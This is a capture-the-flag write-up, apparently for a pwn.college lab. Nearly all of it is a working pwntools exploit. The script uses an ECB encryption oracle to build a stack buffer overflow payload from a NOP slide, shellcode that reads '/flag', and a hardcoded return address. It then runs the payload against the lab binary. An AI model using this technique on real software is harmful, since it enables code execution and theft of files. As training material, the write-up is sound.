# ECB-to-Shellcode (hard)

#### Disassemble challenge and get the padding. 0x70 (112) - 0x10 (16) + 8 = 104
```asm
0x0000000000401715 <+718>:   lea    -0x70(%rbp),%rax
0x0000000000401719 <+722>:   add    $0x10,%rax
```
--------------------------------------

#### Can use most of the script from last challenge, adjusting for shellcode instead of win. Nop slide is what I chose.
```python
from pwn import *
import struct
import re

context.log_level = 'error'

def encrypt(data):
    if len(data) != 16:
        data = data.ljust(16, b'\x90')
    
    io = process(['/challenge/dispatch'])
    io.send(data)
    io.shutdown('send')
    ct = io.recvall(timeout=1)
    io.close()

    return ct[16:32]

def header():
    io = process(['/challenge/dispatch'])
    io.send(b'')
    io.shutdown('send')
    verified = io.recvline()
    io.close()

    return verified[0:16]

context.arch = 'amd64'
asmbl = """
xor rsi, rsi
push rsi
mov rdi, 0x67616c662f
push rdi
mov rdi, rsp
xor rdx, rdx
mov rax, 2
syscall

mov rsi, rax
mov rdi, 1
mov r10, 1000
xor rdx, rdx
mov rax, 40
syscall

mov rax, 60
xor rdi, rdi
syscall
"""

asmbly = asm(asmbl)

ct = header()
stack = 0x7fffffffe9d0 + 16
ret = struct.pack('<Q', stack)

nop_len = 104 - len(asmbly)
nops = b'\x90' * nop_len
buffer = nops + asmbly
pack = buffer + ret

for i in range(0, len(pack), 16):
    strip = pack[i:i+16]
    block = encrypt(strip)
    ct += block

with open('/tmp/s.bin', 'wb') as f:
    f.write(ct)

with open('/tmp/s.bin', 'rb') as f:
    pack = f.read()


io = process('/challenge/vulnerable-overflow')
io.send(pack)
io.shutdown('send')
out = io.recvall(timeout=1)
flag = re.search(rb'pwn\.college\{(.*?)\}', out).group().decode()
print(flag)
```
